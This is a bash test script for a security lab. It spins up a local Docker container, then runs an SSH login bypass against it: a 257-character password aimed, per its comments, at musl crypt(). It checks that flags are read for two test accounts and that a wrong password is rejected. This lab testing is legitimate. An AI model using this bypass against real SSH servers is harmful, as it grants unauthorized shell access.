#!/bin/bash
# End-to-end test for LAB-NAME.
# Runs the exploit, asserts flags are captured, tears down on exit.
set -e

PORT=2222
FAIL=0

cleanup() {
  docker compose down --remove-orphans 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] Building container..."
docker compose up --build -d

# Wait for the service to be ready
echo "[*] Waiting for service on port $PORT..."
for i in $(seq 1 60); do
  nc -z -w2 127.0.0.1 $PORT 2>/dev/null && break
  sleep 2
  if [ "$i" -eq 60 ]; then
    echo "[FAIL] Service did not come up after 120 seconds"
    docker compose logs
    exit 1
  fi
done

run_exploit() {
  local USER=$1
  # TODO: replace this with the actual exploit command for this lab.
  # The command below is for the musl crypt() SSH bypass.
  # It should:
  #   - return 0 on success (exploit worked)
  #   - print output that includes the username and a LAB{} flag
  local PASS
  PASS=$(python3 -c 'print("A"*257, end="")')
  SSHPASS="$PASS" sshpass -e ssh \
    -o StrictHostKeyChecking=no \
    -o ConnectTimeout=10 \
    -o PreferredAuthentications=password \
    -p $PORT "${USER}@127.0.0.1" \
    "id && cat ~/flag.txt" 2>&1
}

# --- Test account 1 ---
echo ""
echo "[*] Testing exploit: user1"
OUT1=$(run_exploit user1)
echo "$OUT1"

if ! echo "$OUT1" | grep -q "user1"; then
  echo "[FAIL] user1: id check failed"
  FAIL=1
elif ! echo "$OUT1" | grep -qE "LAB\{[^}]+\}"; then
  echo "[FAIL] user1: flag not found"
  FAIL=1
else
  echo "[PASS] user1: exploit succeeded, flag captured"
fi

# --- Test account 2 ---
echo ""
echo "[*] Testing exploit: user2"
OUT2=$(run_exploit user2)
echo "$OUT2"

if ! echo "$OUT2" | grep -q "user2"; then
  echo "[FAIL] user2: id check failed"
  FAIL=1
elif ! echo "$OUT2" | grep -qE "LAB\{[^}]+\}"; then
  echo "[FAIL] user2: flag not found"
  FAIL=1
else
  echo "[PASS] user2: exploit succeeded, flag captured"
fi

# --- Confirm normal input is rejected ---
echo ""
echo "[*] Confirming normal input is rejected..."
# TODO: replace with whatever "normal" input looks like for this lab.
REJECT=$(SSHPASS="wrongpass1" sshpass -e ssh \
  -o StrictHostKeyChecking=no \
  -o ConnectTimeout=5 \
  -o PreferredAuthentications=password \
  -p $PORT user1@127.0.0.1 "id" 2>&1 || true)

if echo "$REJECT" | grep -q "Permission denied"; then
  echo "[PASS] Normal input correctly rejected"
else
  echo "[FAIL] Normal input was not rejected"
  FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"
  exit 0
else
  echo "[FAIL] One or more tests failed"
  exit 1
fi
